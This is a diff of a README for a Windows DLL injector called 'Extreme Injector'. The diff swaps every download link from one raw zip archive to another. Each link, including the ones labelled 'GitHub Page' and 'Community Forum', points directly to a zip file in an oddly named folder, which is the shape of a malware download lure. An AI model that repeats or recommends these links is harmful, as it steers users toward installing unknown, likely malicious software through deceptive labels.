@@ -4,7 +4,7 @@
 Welcome to Extreme Injector! This software helps you seamlessly inject Dynamic Link Libraries (DLLs) into other processes on a Windows system. Follow these steps to download and run the application.
 
 ## 📥 Download Extreme Injector
-[![Download Extreme Injector](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme-Injector_v1.7.zip%20Injector-brightgreen)](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme-Injector_v1.7.zip)
+[![Download Extreme Injector](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme_Injector_1.3.zip%20Injector-brightgreen)](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme_Injector_1.3.zip)
 
 ## 🔍 Features
 - Simple interface for easy navigation.
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 This version of Extreme Injector is stable and has been tested for common use cases. Keep an eye out for updates, as we continually improve the software.
 
 ## 📂 Download & Install
-To download Extreme Injector, visit this page: [Download Extreme Injector](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme-Injector_v1.7.zip).
+To download Extreme Injector, visit this page: [Download Extreme Injector](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme_Injector_1.3.zip).
 
 1. Click on the download link above.
 2. Once on the downloads page, look for the latest release.
@@ -58,7 +58,7 @@ After installation, follow these steps to start using Extreme Injector:
 
 ## 📞 Support
 For additional assistance, you can reach out through the following:
-- GitHub Page: [Extreme Injector GitHub](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme-Injector_v1.7.zip)
-- Community Forum: [Extreme Injector Forum](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme-Injector_v1.7.zip)
+- GitHub Page: [Extreme Injector GitHub](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme_Injector_1.3.zip)
+- Community Forum: [Extreme Injector Forum](https://raw.githubusercontent.com/Rillette34/Extreme-Injector/main/redoom/Extreme_Injector_1.3.zip)
 
 By following these guidelines, you can effectively download, install, and use Extreme Injector. We hope you find this tool helpful!
